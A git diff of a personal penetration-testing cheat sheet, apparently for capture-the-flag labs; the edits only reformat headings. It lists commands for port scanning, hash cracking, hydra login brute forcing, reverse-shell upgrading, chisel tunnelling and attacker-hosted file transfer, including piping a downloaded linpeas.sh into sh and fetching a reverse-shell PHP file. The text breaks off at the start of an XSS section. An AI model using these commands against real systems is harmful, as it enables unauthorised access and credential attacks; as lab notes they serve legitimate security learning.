@@ -1,9 +1,8 @@
 # Common Commands/Techniques I Use Frequently (In no particular order)
 
 Enumeration
-======
-### Port Scanning
 ------
+### Port Scanning
 - `IP=x.x.x.x`
 - `sudo masscan -p1-65535 $IP --rate=1000 -e tun0 > ports`
 - `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -17,7 +16,8 @@ Enumeration
 - List all files and folders including hidden ones in a directory `ls al`
 - See if there is anything the current user can run as sudo `sudo -l`
 
-## Encryption/Decryption
+Encryption/Decryption
+------
 ### PGP
 - Add an encryption key you've found to the keyring `gpg --import x.key`
 - Use aforemntioned key to decrypt a file `gpg x.pdf.gpg`
@@ -26,7 +26,8 @@ Enumeration
 ### Hash Cracking
 - Crack an MD5(APR) hash `hashcat -a 0 -m 1600 ./hash /usr/share/wordlists/rockyou.txt`
 
-## Login Brute Forcing
+Login Brute Forcing
+------
 ### FTP
 - Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ftp://x.x.x.x`
 ### SSH
@@ -37,18 +38,21 @@ so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rock
 - Using hydra with some parameters instead of the entire login request example `hydra -l milesdyson -P log1.txt 10.x.x.x http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user`
 - Using hydra to brute force a basic auth page `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt -s 80 -f enum.thm http-get /labs/basic_auth`
 
-## Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
+Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
+------
 ### Using Python
 1. In reverse shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 2. Press CTRL^Z to put the reverse shell in the background
 3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
 4. In the reverse shell that has now been foregrounded `echo TERM=xterm-256color` followed by `reset` if required
 
-## Find files
+Find files
+------
 ### Find Command
 - `find / 2>/dev/null | grep desired_word`
 
-## Tunneling
+Tunneling
+------
 ### SSH
 - Open an SSH session where all traffic to port 1111 on the target machine is forwarded to port 1111 on the attacking machine `ssh user@x.x.x.x -L 1111:localhost:1111`
 ### Chisel
@@ -56,13 +60,15 @@ so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rock
 2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
 3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`
 
-## Facilitation of File Transfers Between Attacker and Target
+Facilitation of File Transfers Between Attacker and Target
+------
 ### Python web server
 1. Start a simple web server from current working directory `python3 -m http.server 8000`
   - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
   - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`
 
-## Web App Testing
+Web App Testing
+------
 ### XSS
 The first thing to do is to look for parameters or input fields on the page, put your unique and easy to find test data in (And submit it or whatever) and then inspect the resultant page to see wher your test data has ended up in the code. Understanding the context where it ends up will determine what type of payload you'll need to use (Try things like closing the tag/variable that it ends up in and/or commenting out any code after the payload, bypassing filtering/escaping/CSP for example). 
 Things to consider:
